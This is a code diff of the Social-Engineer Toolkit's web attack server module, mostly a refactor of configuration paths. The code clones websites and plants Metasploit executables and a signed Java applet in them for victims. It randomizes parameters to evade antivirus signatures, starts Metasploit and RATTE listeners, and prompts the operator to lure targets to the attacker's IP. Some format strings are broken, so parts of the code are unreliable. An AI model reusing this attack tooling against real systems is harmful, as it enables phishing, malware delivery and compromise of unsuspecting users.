@@ -27,26 +27,22 @@ if applet_name == "":
 custom = 0
 if check_options("CUSTOM_EXE="):
     custom = 1
-    print_status(
-        "Note that since you are using a custom payload, you will need to create your OWN listener.")
-    print_status(
-        "SET has no idea what type of payload you are using, so you will need to set this up manually.")
-    print_status(
-        "If using a custom Metasploit payload, setup a multi/handler, etc. to capture the connection back.")
+    if not "CMD/MULTI" in check_options("CUSTOM_EXE="):
+        # here we need to modify the java applet to recognize custom attribute
+        fileopen3 = fileopen = open("%s/web_clone/index.html" % (userconfigpath), "r")
+        filewrite = open("%s/web_clone/index.html.new" % (userconfigpath), "w")
+        data = fileopen3.read()
 
-    # here we need to modify the java applet to recognize custom attribute
-    fileopen3 = fileopen = open("%s/web_clone/index.html" % (setdir), "r")
-    filewrite = open("%s/web_clone/index.html.new" % (setdir), "w")
-    data = fileopen3.read()
+        # we randomize param name so static sigs cant be used
+        goat_random = generate_random_string(4, 4)
+        data = data.replace('param name="8" value="YES"', 'param name="8" value="%s"' % (goat_random))
+        filewrite.write(data)
+        filewrite.close()
+        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (userconfigpath, userconfigpath), shell=True).wait()
 
-    # we randomize param name so static sigs cant be used
-    goat_random = generate_random_string(4, 4)
-    data = data.replace('param name="8" value="YES"',
-                        'param name="8" value="%s"' % (goat_random))
-    filewrite.write(data)
-    filewrite.close()
-    subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" %
-                     (setdir, setdir), shell=True).wait()
+    print_status("Note that since you are using a custom payload, you will need to create your OWN listener.")
+    print_status("SET has no idea what type of payload you are using, so you will need to set this up manually.")
+    print_status("If using a custom Metasploit payload, setup a multi/handler, etc. to capture the connection back.")
 
 
 # set current path
@@ -71,8 +67,8 @@ msf_path = ""
 
 # see if we are using setshell
 set_payload = ""
-if os.path.isfile(setdir + "/set.payload"):
-    fileopen = open(setdir + "/set.payload", "r")
+if os.path.isfile(userconfigpath + "set.payload"):
+    fileopen = open(userconfigpath + "set.payload", "r")
     for line in fileopen:
         set_payload = line.rstrip()
 
@@ -81,8 +77,6 @@ if os.path.isfile(setdir + "/set.payload"):
 # Start of the SET Web Server for multiattack, java applet, etc.
 #
 ##########################################################################
-
-
 def web_server_start():
     # define if use apache or not
     apache = 0
@@ -100,8 +94,8 @@ def web_server_start():
     web_port = check_config("WEB_PORT=")
 
     # see if exploit requires webdav
-    if os.path.isfile(setdir + "/meta_config"):
-        fileopen = open(setdir + "/meta_config", "r")
+    if os.path.isfile(userconfigpath + "meta_config"):
+        fileopen = open(userconfigpath + "meta_config", "r")
         for line in fileopen:
             line = line.rstrip()
             match = re.search("set SRVPORT 80", line)
@@ -117,8 +111,8 @@ def web_server_start():
         ipaddr = input("Enter your ipaddress: ")
 
     # Grab custom or set defined
-    if os.path.isfile(setdir + "/site.template"):
-        fileopen = open(setdir + "/site.template", "r").readlines()
+    if os.path.isfile(userconfigpath + "site.template"):
+        fileopen = open(userconfigpath + "site.template", "r").readlines()
         for line in fileopen:
             line = line.rstrip()
             match = re.search("TEMPLATE=", line)
@@ -127,13 +121,13 @@ def web_server_start():
                 template = line[1]
 
     # grab web attack selection
-    if os.path.isfile(setdir + "/attack_vector"):
-        fileopen = open(setdir + "/attack_vector", "r").readlines()
+    if os.path.isfile(userconfigpath + "attack_vector"):
+        fileopen = open(userconfigpath + "attack_vector", "r").readlines()
         for line in fileopen:
             attack_vector = line.rstrip()
 
     # if it doesn't exist just set a default template
-    if not os.path.isfile(setdir + "/attack_vector"):
+    if not os.path.isfile(userconfigpath + "attack_vector"):
         attack_vector = "nada"
 
     # Sticking it to A/V below
@@ -148,14 +142,14 @@ def web_server_start():
 
     # check multiattack flags here
     multiattack_harv = "off"
-    if os.path.isfile(setdir + "/multi_harvester"):
+    if os.path.isfile(userconfigpath + "multi_harvester"):
         multiattack_harv = "on"
-    if os.path.isfile(setdir + "/multi_tabnabbing"):
+    if os.path.isfile(userconfigpath + "multi_tabnabbing"):
         multiattack_harv = "on"
 
     # open our config file that was specified in SET
-    if os.path.isfile(setdir + "/site.template"):
-        fileopen = open(setdir + "/site.template", "r").readlines()
+    if os.path.isfile(userconfigpath + "site.template"):
+        fileopen = open(userconfigpath + "site.template", "r").readlines()
         # start loop here
         for line in fileopen:
             line = line.rstrip()
@@ -167,7 +161,7 @@ def web_server_start():
                 url = line[1].rstrip()
 
     # if we didn't create template then do self
-    if not os.path.isfile(setdir + "/site.template"):
+    if not os.path.isfile(userconfigpath + "site.template"):
         template = "SELF"
 
     # If SET is setting up the website for you, get the website ready for
@@ -227,38 +221,38 @@ def web_server_start():
             if attack_vector != 'hijacking':
                 print(bcolors.YELLOW + "[*] Moving payload into cloned website." + bcolors.ENDC)
                 # copy all the files needed
-                if not os.path.isfile(setdir + "/" + applet_name):
+                if not os.path.isfile(userconfigpath + "" + applet_name):
                     shutil.copyfile("%s/src/html/Signed_Update.jar.orig" %
-                                    (definepath), "%s/%s" % (setdir, applet_name))
-                shutil.copyfile(setdir + "/%s" % (applet_name),
-                                "%s/web_clone/%s" % (setdir, applet_name))
+                                    (definepath), "%s/%s" % (userconfigpath, applet_name))
+                shutil.copyfile(userconfigpath + "%s" % (applet_name),
+                                "%s/web_clone/%s" % (userconfigpath, applet_name))
                 if os.path.isfile("%s/src/html/nix.bin" % (definepath)):
                     nix = check_options("NIX.BIN=")
                     shutil.copyfile("%s/src/html/nix.bin" %
-                                    (definepath), "%s/web_clone/%s" % (setdir, nix))
+                                    (definepath), "%s/web_clone/%s" % (userconfigpath, nix))
                 if os.path.isfile("%s/src/html/mac.bin" % (definepath)):
                     mac = check_options("MAC.BIN=")
                     shutil.copyfile("%s/src/html/mac.bin" % (definepath),
-                                    "%s/web_clone/%s" % (setdir, definepath, mac))
-                if os.path.isfile(setdir + "/msf.exe"):
+                                    "%s/web_clone/%s" % (userconfigpath, definepath, mac))
+                if os.path.isfile(userconfigpath + "msf.exe"):
                     win = check_options("MSF.EXE=")
-                    shutil.copyfile(setdir + "/msf.exe",
-                                    "%s/web_clone/%s" % (setdir, win))
+                    shutil.copyfile(userconfigpath + "msf.exe",
+                                    "%s/web_clone/%s" % (userconfigpath, win))
 
                 # pull random name generation
                 print_status(
                     "The site has been moved. SET Web Server is now listening..")
                 rand_gen = check_options("MSF_EXE=")
                 if rand_gen != 0:
-                    if os.path.isfile(setdir + "/custom.exe"):
-                        shutil.copyfile(setdir + "/msf.exe",
-                                        setdir + "/web_clone/msf.exe")
+                    if os.path.isfile(userconfigpath + "custom.exe"):
+                        shutil.copyfile(userconfigpath + "msf.exe",
+                                        userconfigpath + "web_clone/msf.exe")
                         print("\n[*] Website has been cloned and custom payload imported. Have someone browse your site now")
-                    shutil.copyfile(setdir + "/web_clone/msf.exe",
-                                    setdir + "/web_clone/%s" % (rand_gen))
+                    shutil.copyfile(userconfigpath + "web_clone/msf.exe",
+                                    userconfigpath + "web_clone/%s" % (rand_gen))
 
     # if docbase exploit do some funky stuff to get it to work right
-    if os.path.isfile(setdir + "/docbase.file"):
+    if os.path.isfile(userconfigpath + "docbase.file"):
         docbase = (r"""<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
          "http://www.w3.org/TR/html4/frameset.dtd">
         <HTML>
@@ -270,11 +264,11 @@ def web_server_start():
         <FRAME name=docbase noresize borders=0 scrolling=no src="http://%s:8080">
         </FRAMESET>
         </HTML>""" % (ipaddr))
-        if os.path.isfile(setdir + "/web_clone/site.html"):
-            os.remove(setdir + "/web_clone/site.html")
-        shutil.copyfile(setdir + "/web_clone/index.html",
-                        setdir + "/web_clone/site.html")
-        filewrite = open(setdir + "/web_clone/index.html", "w")
+        if os.path.isfile(userconfigpath + "web_clone/site.html"):
+            os.remove(userconfigpath + "web_clone/site.html")
+        shutil.copyfile(userconfigpath + "web_clone/index.html",
+                        userconfigpath + "web_clone/site.html")
+        filewrite = open(userconfigpath + "web_clone/index.html", "w")
         filewrite.write(docbase)
         filewrite.close()
 
@@ -291,16 +285,18 @@ def web_server_start():
                 import src.core.webserver as webserver
                 # specify the path for the SET web directories for the applet
                 # attack
-                path = (setdir + "/web_clone/")
+                path = (userconfigpath + "web_clone/")
                 try:
                     import multiprocessing
-                    p = multiprocessing.Process(
-                        target=webserver.start_server, args=(web_port, path))
+                    p = multiprocessing.Process(target=webserver.start_server, args=(web_port, path))
                     p.start()
-                except Exception:
+
+                except KeyboardInterrupt:
+                    p.stop()
+
+                except Exception as e:
                     import thread
-                    thread.start_new_thread(
-                        webserver.start_server, (web_port, path))
+                    thread.start_new_thread(webserver.start_server, (web_port, path))
 
             # Handle KeyboardInterrupt
             except KeyboardInterrupt:
@@ -315,17 +311,16 @@ def web_server_start():
                 print(bcolors.ENDC + "Do you want to try to stop Apache? y/n")
                 stop_apache = input("Attempt to stop Apache? y/n: ")
                 if stop_apache == "yes" or stop_apache == "y" or stop_apache == "":
-                    subprocess.Popen(
-                        "/etc/init.d/apache2 stop", shell=True).wait()
+                    subprocess.Popen("/etc/init.d/apache2 stop", shell=True).wait()
+                    subprocess.Popen("/etc/init.d/nginx stop", shell=True).wait()
                     try:
 
                         # specify port listener here
                         import src.core.webserver as webserver
                         # specify the path for the SET web directories for the
                         # applet attack
-                        path = (setdir + "/web_clone/")
-                        p = multiprocessing.Process(
-                            target=webserver.start_server, args=(web_port, path))
+                        path = (userconfigpath + "web_clone/")
+                        p = multiprocessing.Process(target=webserver.start_server, args=(web_port, path))
                         p.start()
 
                     except Exception:
@@ -341,19 +336,20 @@ def web_server_start():
                         # try block inside of loop, if control-c detected, then
                         # exit
                         try:
-                            print_warning(
-                                "Note that if you are using a CUSTOM payload. YOU NEED TO CREATE A LISTENER!!!!!")
+                            print_warning("Note that if you are using a CUSTOM payload. YOU NEED TO CREATE A LISTENER!!!!!")
                             pause = input(
                                 bcolors.GREEN + "\n[*] Web Server is listening. Press Control-C to exit." + bcolors.ENDC)
 
                         # handle keyboard interrupt
                         except KeyboardInterrupt:
                             print(bcolors.GREEN + "[*] Returning to main menu." + bcolors.ENDC)
+                            try: p.stop()
+                            except: pass
                             break
 
     if apache == 1:
         subprocess.Popen("cp %s/src/html/*.bin %s 1> /dev/null 2> /dev/null;cp %s/src/html/*.html %s 1> /dev/null 2> /dev/null;cp %s/web_clone/* %s 1> /dev/null 2> /dev/null;cp %s/msf.exe %s 1> /dev/null 2> /dev/null;cp %s/*.jar %s 1> /dev/null 2> /dev/null" %
-                         (definepath, apache_path, definepath, apache_path, setdir, apache_path, setdir, apache_path, setdir, apache_path), shell=True).wait()
+                         (definepath, apache_path, definepath, apache_path, userconfigpath, apache_path, userconfigpath, apache_path, userconfigpath, apache_path), shell=True).wait()
         # if we are tracking users
         if track_email == "on":
             now = datetime.datetime.today()
@@ -398,15 +394,15 @@ web_server = check_config("WEB_PORT=")
 
 # setup multi attack options here
 multiattack = "off"
-if os.path.isfile(setdir + "/multi_tabnabbing"):
+if os.path.isfile(userconfigpath + "multi_tabnabbing"):
     multiattack = "on"
-if os.path.isfile(setdir + "/multi_harvester"):
+if os.path.isfile(userconfigpath + "multi_harvester"):
     multiattack = "on"
 
 # Grab custom or set defined
 template = ""
-if os.path.isfile(setdir + "/site.template"):
-    fileopen = open(setdir + "/site.template", "r").readlines()
+if os.path.isfile(userconfigpath + "site.template"):
+    fileopen = open(userconfigpath + "site.template", "r").readlines()
     for line in fileopen:
         line = line.rstrip()
         match = re.search("TEMPLATE=", line)
@@ -535,8 +531,8 @@ try:
             print((
                 bcolors.GREEN + "[--] Apache web server is currently in use for performance. [--]" + bcolors.ENDC))
 
-    if os.path.isfile(setdir + "/meta_config"):
-        fileopen = open(setdir + "/meta_config", "r")
+    if os.path.isfile(userconfigpath + "meta_config"):
+        fileopen = open(userconfigpath + "meta_config", "r")
         for line in fileopen:
             line = line.rstrip()
             match = re.search("set SRVPORT 80", line)
@@ -544,17 +540,15 @@ try:
                 match2 = re.search("set SRVPORT 8080", line)
                 if not match2:
                     if apache == 1:
-                        print_warning(
-                            "Apache appears to be configured in the SET (set_config)")
-                        print_warning(
-                            "You will need to disable Apache and re-run SET since Metasploit requires port 80 for WebDav")
+                        print_warning("Apache appears to be configured in the SET (set_config)")
+                        print_warning("You will need to disable Apache and re-run SET since Metasploit requires port 80 for WebDav")
                         exit_set()
                     print(bcolors.RED + """Since the exploit picked requires port 80 for WebDav, the\nSET HTTP Server port has been changed to 8080. You will need\nto coax someone to your IP Address on 8080, for example\nyou need it to be http://172.16.32.50:8080 instead of standard\nhttp (80) traffic.""")
 
     web_server_start()
     # if we are using ettercap
-    if os.path.isfile(setdir + "/ettercap"):
-        fileopen5 = open(setdir + "/ettercap", "r")
+    if os.path.isfile(userconfigpath + "ettercap"):
+        fileopen5 = open(userconfigpath + "ettercap", "r")
         for line in fileopen5:
             ettercap = line.rstrip()
             # run in background
@@ -564,7 +558,8 @@ try:
                              stderr=subprocess.PIPE, stdout=subprocess.PIPE)
 
     # if metasploit config is in directory
-    if os.path.isfile(setdir + "/meta_config"):
+    if os.path.isfile(userconfigpath + "meta_config"):
+      if ("CUSTOM" not in template) and ("SELF" not in template):
         print_info("Launching MSF Listener...")
         print_info("This may take a few to load MSF...")
         # this checks to see if we want to start a listener
@@ -576,12 +571,11 @@ try:
                 import pexpect
             # specify if we are using the multi pyinjector
             meta_config = "meta_config"
-            if os.path.isfile(setdir + "/meta_config_multipyinjector"):
+            if os.path.isfile(userconfigpath + "meta_config_multipyinjector"):
                 meta_config = "meta_config_multipyinjector"
             # if we arent using a custom payload
             if custom != 1:
-                child1 = pexpect.spawn(
-                    "%smsfconsole -r %s/%s\r\n\r\n" % (msf_path, setdir, meta_config))
+                child1 = pexpect.spawn("%smsfconsole -r %s/%s\r\n\r\n" % (msf_path, userconfigpath, meta_config))
             # check if we want to deliver emails or track users that click the
             # link
             webattack_email = check_config("WEBATTACK_EMAIL=").lower()
@@ -595,11 +589,11 @@ try:
         if custom != 1:
             child1.interact()
 
-    if os.path.isfile(setdir + "/set.payload"):
+    if os.path.isfile(userconfigpath + "set.payload"):
         port = check_options("PORT=")
 
         # grab configuration
-        fileopen = open(setdir + "/set.payload", "r")
+        fileopen = open(userconfigpath + "set.payload", "r")
         for line in fileopen:
             set_payload = line.rstrip()
 
@@ -630,12 +624,12 @@ try:
 
             # if not then run it in windows
             if operating_system == "windows":
-                if not os.path.isfile(setdir + "/ratteserver.exe"):
+                if not os.path.isfile(userconfigpath + "ratteserver.exe"):
                     shutil.copyfile(
-                        "../../payloads/ratte/ratteserver.binary", setdir + "/ratteserver.exe")
+                        "../../payloads/ratte/ratteserver.binary", userconfigpath + "ratteserver.exe")
                     shutil.copyfile(
-                        "../../payloads/ratte/cygwin1.dll", setdir + "/cygwin1.dll")
-                    os.system(setdir + "/ratteserver %s" % (definepath, port))
+                        "../../payloads/ratte/cygwin1.dll", userconfigpath + "cygwin1.dll")
+                    os.system(userconfigpath + "ratteserver %s" % (definepath, port))
 
 # handle errors
 except Exception as e:
